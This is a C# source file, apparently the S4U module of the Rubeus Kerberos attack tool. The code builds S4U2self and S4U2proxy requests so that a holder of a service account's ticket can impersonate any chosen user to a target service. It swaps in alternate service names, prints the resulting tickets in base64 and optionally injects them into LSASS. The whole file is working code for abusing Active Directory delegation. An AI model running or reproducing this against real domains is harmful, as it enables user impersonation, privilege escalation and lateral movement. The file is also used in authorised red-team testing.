using System;
using System.IO;
using System.Linq;
using Asn1;

namespace Rubeus
{
    public class S4U
    {
        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
        {
            // first retrieve a TGT for the user
            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false, domainController, new Interop.LUID());

            if (kirbiBytes == null)
            {
                Console.WriteLine("[X] Error retrieving a TGT with the supplied parameters");
                return;
            }
            else
            {
                Console.WriteLine("\r\n");
            }

            // transform the TGT bytes into a .kirbi file
            KRB_CRED kirbi = new KRB_CRED(kirbiBytes);

            // execute the s4u process
            Execute(kirbi, targetUser, targetSPN, ptt, domainController, altService, tgs);
        }
        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
        {
            Console.WriteLine("[*] Action: S4U\r\n");

            if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)
            {
                Console.WriteLine("[*] Loaded a TGS for {0}\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
                S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, tgs.tickets[0]);
            }
            else
            {
                Ticket self = S4U2Self(kirbi, targetUser, targetSPN, ptt, domainController, altService);
                if (String.IsNullOrEmpty(targetSPN) == false)
                {
                    S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, self);
                }
            }
        }
        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", Ticket tgs = null)
        {
            Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
            if (!String.IsNullOrEmpty(altService))
            {
                string[] altSnames = altService.Split(',');
                if (altSnames.Length == 1)
                {
                    Console.WriteLine("[*]   Final ticket will be for the alternate service '{0}'", altService);
                }
                else
                {
                    Console.WriteLine("[*]   Final tickets will be for the alternate services '{0}'", altService);
                }
            }

            // extract out the info needed for the TGS-REQ/S4U2Proxy execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return; }
            Console.WriteLine("[*] Building S4U2proxy request for service: '{0}'", targetSPN);
            TGS_REQ s4u2proxyReq = new TGS_REQ();
            PA_DATA padata = new PA_DATA(domain, userName, ticket, clientKey, etype);
            s4u2proxyReq.padata.Add(padata);
            PA_DATA pac_options = new PA_DATA(false, false, false, true);
            s4u2proxyReq.padata.Add(pac_options);

            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CNAMEINADDLTKT;

            s4u2proxyReq.req_body.realm = domain;

            string[] parts = targetSPN.Split('/');
            string serverName = parts[parts.Length-1];

            s4u2proxyReq.req_body.sname.name_type = 2;
            foreach(string part in parts)
            {
                s4u2proxyReq.req_body.sname.name_string.Add(part);
            }

            // supported encryption types
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);

            // add in the ticket from the S4U2self response
            s4u2proxyReq.req_body.additional_tickets.Add(tgs);

            byte[] s4ubytes = s4u2proxyReq.Encode().Encode();

            Console.WriteLine("[*] Sending S4U2proxy request");
            byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
            if (response2 == null)
            {
                return;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response2, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 13)
            {
                Console.WriteLine("[+] S4U2proxy success!");

                // parse the response to an TGS-REP
                TGS_REP rep2 = new TGS_REP(responseAsn);

                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
                AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);

                if (!String.IsNullOrEmpty(altService))
                {
                    string[] altSnames = altService.Split(',');

                    foreach (string altSname in altSnames)
                    {
                        // now build the final KRB-CRED structure with one or more alternate snames
                        KRB_CRED cred = new KRB_CRED();

                        // since we want an alternate sname, first substitute it into the ticket structure
                        rep2.ticket.sname.name_string[0] = altSname;

                        // add the ticket
                        cred.tickets.Add(rep2.ticket);

                        // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                        KrbCredInfo info = new KrbCredInfo();

                        // [0] add in the session key
                        info.key.keytype = encRepPart2.key.keytype;
                        info.key.keyvalue = encRepPart2.key.keyvalue;

                        // [1] prealm (domain)
                        info.prealm = encRepPart2.realm;

                        // [2] pname (user)
                        info.pname.name_type = rep2.cname.name_type;
                        info.pname.name_string = rep2.cname.name_string;

                        // [3] flags
                        info.flags = encRepPart2.flags;

                        // [4] authtime (not required)

                        // [5] starttime
                        info.starttime = encRepPart2.starttime;

                        // [6] endtime
                        info.endtime = encRepPart2.endtime;

                        // [7] renew-till
                        info.renew_till = encRepPart2.renew_till;

                        // [8] srealm
                        info.srealm = encRepPart2.realm;

                        // [9] sname
                        info.sname.name_type = encRepPart2.sname.name_type;
                        info.sname.name_string = encRepPart2.sname.name_string;

                        // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
                        Console.WriteLine("[*] Substituting alternative service name '{0}'", altSname);
                        info.sname.name_string[0] = altSname;

                        // add the ticket_info into the cred object
                        cred.enc_part.ticket_info.Add(info);

                        byte[] kirbiBytes = cred.Encode().Encode();

                        string kirbiString = Convert.ToBase64String(kirbiBytes);

                        Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}/{1}':\r\n", altSname, serverName);

                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                        if (ptt)
                        {
                            // pass-the-ticket -> import into LSASS
                            LSA.ImportTicket(kirbiBytes, new Interop.LUID());
                        }
                    }
                }
                else
                {
                    // now build the final KRB-CRED structure, no alternate snames
                    KRB_CRED cred = new KRB_CRED();

                    // if we want an alternate sname, first substitute it into the ticket structure
                    if (!String.IsNullOrEmpty(altService))
                    {
                        rep2.ticket.sname.name_string[0] = altService;
                    }

                    // add the ticket
                    cred.tickets.Add(rep2.ticket);

                    // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                    KrbCredInfo info = new KrbCredInfo();

                    // [0] add in the session key
                    info.key.keytype = encRepPart2.key.keytype;
                    info.key.keyvalue = encRepPart2.key.keyvalue;

                    // [1] prealm (domain)
                    info.prealm = encRepPart2.realm;

                    // [2] pname (user)
                    info.pname.name_type = rep2.cname.name_type;
                    info.pname.name_string = rep2.cname.name_string;

                    // [3] flags
                    info.flags = encRepPart2.flags;

                    // [4] authtime (not required)

                    // [5] starttime
                    info.starttime = encRepPart2.starttime;

                    // [6] endtime
                    info.endtime = encRepPart2.endtime;

                    // [7] renew-till
                    info.renew_till = encRepPart2.renew_till;

                    // [8] srealm
                    info.srealm = encRepPart2.realm;

                    // [9] sname
                    info.sname.name_type = encRepPart2.sname.name_type;
                    info.sname.name_string = encRepPart2.sname.name_string;

                    // add the ticket_info into the cred object
                    cred.enc_part.ticket_info.Add(info);

                    byte[] kirbiBytes = cred.Encode().Encode();

                    string kirbiString = Convert.ToBase64String(kirbiBytes);

                    Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);

                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                    if (ptt)
                    {
                        // pass-the-ticket -> import into LSASS
                        LSA.ImportTicket(kirbiBytes, new Interop.LUID());
                    }
                }
            }
            else if (responseTag == 30)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
        }
        private static Ticket S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "")
        {
            // extract out the info needed for the TGS-REQ/S4U2Self execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            Console.WriteLine("[*] Building S4U2self request for: '{0}@{1}'", userName, domain);

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser);

            Console.WriteLine("[*] Sending S4U2self request");
            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 13)
            {
                Console.WriteLine("[+] S4U2self success!");

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                Console.WriteLine("[*] Got a TGS for '{0}' to '{1}@{2}'", info.pname.name_string[0], info.sname.name_string[0], info.srealm);
                Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
                Console.WriteLine("");

                return rep.ticket;
            }
            else if (responseTag == 30)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }

            return null;
        }
    }
}